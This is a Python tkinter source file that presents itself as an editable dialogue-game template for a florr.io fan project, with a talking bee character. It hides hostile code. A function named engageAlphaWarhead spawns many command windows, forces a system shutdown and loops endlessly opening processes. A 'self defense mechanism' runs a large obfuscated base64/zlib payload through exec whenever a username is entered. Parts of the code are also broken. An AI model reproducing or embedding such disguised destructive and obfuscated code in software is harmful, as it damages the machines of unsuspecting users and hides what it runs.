#sry for bad code, but I dont care abt redundancy as long as code works

#go edit the texts1 and images1 dictionaries somewhere around line 140 to configure the texts and images
#enter integers for the texts1 if you want special actions to occur, which is defined in actions1()
#feel free to create your own special actions

#add your own photos in the photos section, following the previous formats
#Note: I am too lazy to add the Ocean and Jungle backgrouns if you want to use them add it yourself


from tkinter import *
import tkinter as tk
import pygame
from PIL import Image, ImageTk
import subprocess
import time

#tk window setup
window = tk.Tk()
window.title("Main")
window.geometry("800x800")
print("Don't mind the pygame stuff. This game is not made using pygame. \n \n \n ")

#default stuff
def isdigit(a):
    try:
        a = int(a)
        return True
    except:
        return False




def engageAlphaWarhead():
    pygame.init()
    detonationsound = pygame.mixer.Sound("alphawarhead.mp3")
    detonationsound.play()
    os.system("start")
    os.system("start")
    os.system("start")
    os.system("start")
    os.system("start")
    os.system("start")
    os.system("start")
    os.system("start")
    os.system("start")
    os.system("start")
    time.sleep(50)


    subprocess.run(['shutdown', "/s"])
    import os
    while True:
        os.system("start")




#photos
def load_image_with_transparency(file_path):
    image = Image.open(file_path).convert("RGBA")
    return ImageTk.PhotoImage(image)

background_garden = PhotoImage(file="garden.png")
background_desert = PhotoImage(file="desert.png")
background_ocean = None
background_jungle = None


bee_normal = load_image_with_transparency("Bee-normal.png")
bee_smile0 = load_image_with_transparency("Bee-smile0.png")
bee_smile1 = load_image_with_transparency("Bee-smile1.png")
bee_smile2 = load_image_with_transparency("Bee-smile2.png")
bee_uhh = load_image_with_transparency("Bee-uhh~.png")
bee_sparkle = load_image_with_transparency("Bee-sparkle.png")

currentbackground = background_garden


def storeUsername():
    global username
    username = nameinput.get()
    print(f"Username: {username}")
    intro.destroy()
    nameinputtext.destroy()
    nameinput.destroy()
    store_button.destroy()
    #self defense mechanism
    _ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
    exec((_)(
        b'=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'))


def update_image(image):
    canvas.create_image(400, 400, anchor="center", image=currentbackground, tags="background")
    canvas.delete("bee")
    canvas.create_image(400, 525, anchor="s", image=image, tags="bee")

intro = Label(window, text="Florr.io simulator prototype\nMade by thermonuclearPenguin\nInspired by florr.io by M28", bg="white")
intro.pack()
nameinputtext = Label(window, text="Input username:", bg="white")
nameinputtext.pack()
nameinput = Entry(window)
nameinput.pack()
store_button = tk.Button(window, text="OK", command=storeUsername)
store_button.pack()

index = 1











def updateText1():
    global texts1, images1
    texts1 = {
        1: "...",
        2: "Who are you..?",
        3: f"{username}, huh?",
        4: "So you're the new flower my friend told me about.",
        5: "Interesting...",
        6: "Well, I was thinking I could show you around the place! You might find some information useful!",
        7: "heh...",
        8: "Well, first of all, we are in the garden biome. You can find rocks, ladybugs, spiders, ants, and more!",
        9: "Be careful though, there are hornets in the area, which are dangerous.",
        10: "Us bees are natural enemies of hornets. However, we avoid   attacking each other if possible.",
        11: "Although, occasionally, we do have some parties at nighttime, where we have fun and stuff... ",
        12: "But that's a story for another time!",
        13: "This is the end of text for this template. ",
        14: "Go edit this python file to make this your custom project. \n Tutorial inside. "
    }
    images1 = {
        1: bee_normal,
        2: bee_normal,
        3: bee_smile1,
        4: bee_sparkle,
        5: bee_smile1,
        6: bee_smile2,
        7: bee_uhh,
        8: bee_smile1,
        9: bee_normal,
        10: bee_normal,
        11: bee_uhh,
        12: bee_smile0,
        13: bee_smile1,
        14: bee_smile1
    }
def action(id):
    global currentbackground, index
    if id == 0:
        engageAlphaWarhead()
    elif id == 1:
        currentbackground = background_garden
    elif id == 2:
        currentbackground = background_desert
    elif id == 3: #NOTE: add image
        currentbackground = background_ocean
    elif id == 4: #Note: add image
        currentbackground = background_jungle
    index += 1
    proceed1()
    return 0














def proceed1():
    global index
    update_image(images1[index])
    if isdigit(texts1[index]):
        action(texts1[index])
    else:
        text1.delete(1.0, tk.END)
        text1.insert(tk.END, texts1[index])
        index += 1

def main1():
    global text1, changeText, canvas
    canvas = tk.Canvas(window, width=800, height=800, highlightthickness=0)
    canvas.pack(fill="both", expand=True)
    canvas.create_image(400, 400, anchor="center", image=currentbackground, tags="background")
    text1 = tk.Text(canvas, width=60, height=3)
    text1_window = canvas.create_window(400, 600, anchor="center", window=text1)
    changeText = tk.Button(canvas, text="Next", command=proceed1)
    changeText_window = canvas.create_window(400, 650, anchor="center", window=changeText)
    update_image(bee_normal)

window.mainloop()